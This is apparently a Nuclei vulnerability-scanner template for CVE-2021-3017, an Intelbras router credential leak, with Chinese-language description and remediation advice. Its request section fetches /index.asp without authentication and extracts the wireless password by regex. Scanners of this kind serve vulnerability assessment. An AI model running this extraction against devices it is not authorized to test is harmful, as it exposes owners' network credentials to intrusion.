id: CVE-2021-3017
info:
  name: Intelbras WIN 300/WRN 342 Credential Disclosure
  author:
  - pikpikcu
  tags:
  - cve
  - cve2021
  - exposure
  - router
  description: |-
    Intelbras IWR 3000N凭证披露
    Intelbras IWR 3000N是波兰Intelbras公司的一款无线路由器。

    Intelbras WIN 300 and WRN 342 devices 2021-01-04版本及之前版本存在安全漏洞，该漏洞允许远程攻击者通过读取HTML源代码中的def wireless spassword行来发现凭据。
  reference:
  - https://poc.wgpsec.org/peiqi_wiki/%e7%bd%91%e7%bb%9c%e8%ae%be%e5%a4%87%e6%bc%8f%e6%b4%9e/intelbras/intelbras%20wireless%20%e6%9c%aa%e6%8e%88%e6%9d%83%e4%b8%8e%e5%af%86%e7%a0%81%e6%b3%84%e9%9c%b2%20cve-2021-3017.html
  - https://nvd.nist.gov/vuln/detail/cve-2021-3017
  - https://www.intelbras.com/pt-br/ajuda-download/faq/roteador-wireless-veloz-wrn-342
  - https://pastebin.com/ctytf0yn
  severity: high
  classification:
    cve-id:
    - cve-2021-3017
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：https://www.intelbras.com/pt-br/ajuda-download/faq/roteador-wireless-veloz-wrn-342

    临时修复方案：
    1、去除页面、cookie或缓存中涉及的敏感信息或删除泄露信息页面
    2、将敏感信息进行加密存储，非必要不可发送前端
    3、发送敏感信息时需加密传输，如有必要需脱敏处理
    4、禁止用自己开发的加密算法，必须使用公开、安全的标准加密算法。
    5、禁止在日志中记录明文的敏感数据：禁止在日志中记录明文的敏感数据（如口
    令、会话标识jsessionid等）， 防止敏感信息泄漏。
    6、禁止带有敏感数据的Web页面缓存：带有敏感数据的Web页面都应该禁止缓
    存，以防止敏感信息泄漏或通过代理服务器上网的用户数据互窜问题。
    7、对必须发送的敏感数据或页面请求接口做好严格的权限认证
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - def_wirelesspassword =
    - <title>Roteador Wireless</title>
  - type: status
    status:
    - 200
  extractors:
  - type: regex
    regex:
    - def_wirelesspassword = "([A-Za-z0-9=]+)";
    part: body
  matchers-condition: and
  path:
  - '{{BaseURL}}/index.asp'
  method: GET
